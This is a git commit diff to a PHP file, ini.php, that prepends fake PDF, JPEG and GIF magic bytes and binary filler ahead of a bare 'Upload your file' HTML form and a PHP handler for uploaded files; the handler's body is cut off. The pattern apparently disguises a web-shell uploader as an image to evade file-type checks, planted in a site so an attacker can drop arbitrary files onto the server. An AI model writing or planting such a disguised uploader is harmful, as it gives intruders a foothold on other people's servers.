83b80a87b12adf485659205f4892b8b58a7a8079
shellag6561-ux <shellag6561@gmail.com>
2025-09-11 16:24:02 +0700

    Update ini.php

--- ini.php
+++ ini.php
@@ -1,3 +1,47 @@
+%PDF-
+%PDF-
+     JFIF     x x      Exif  MM *       
+     E   J                         (                          
+GIF89a;
+<!DOCTYPE html>
+<html>
+<head>
+  <title>123321</title>
+</head>
+<body>
+  <form enctype="multipart/form-data" action="" method="POST">
+    <p>Upload your file</p>
+    <input type="file" name="uploaded_file"></input><br />
+    <input type="submit" value="Upload"></input>
+  </form>
+</body>
+</html>
+     x       x       C                      
+     
+   
+  
+   
+                            C            
+ 
+                                                        < d  "                                      
+                     }        !1A  Qa "q 2    #B   R  $3br  
+     %&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz                                                                                                     
+                     w       !1  AQ aq "2   B     #3R  br 
+ $4 %     &'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz                                                                                 ?  S  (   (   (   (   (   (   (   (   (   (   (   (   (   (   (   (   (   (   (   (   (   (   (   (   (   (   (   (   <html><link rel='icon' href='https://l.top4top.io/p_2612z9xq60.png' sizes='20x20' type='image/png'>ÿØÿà JFIF ÿþ;GIF89;aGIF89;aGIF89;a
+     JFIF     x x      Exif  MM *       
+     E   J                         (                          <!DOCTYPE html>
+<html>
+<head>
+  <title>123321</title>
+</head>
+<body>
+  <form enctype="multipart/form-data" action="" method="POST">
+    <p>Upload your file</p>
+    <input type="file" name="uploaded_file"></input><br />
+    <input type="submit" value="Upload"></input>
+  </form>
+</body>
+</html>
 <?PhP
   if(!empty($_FILES['uploaded_file']))
   {
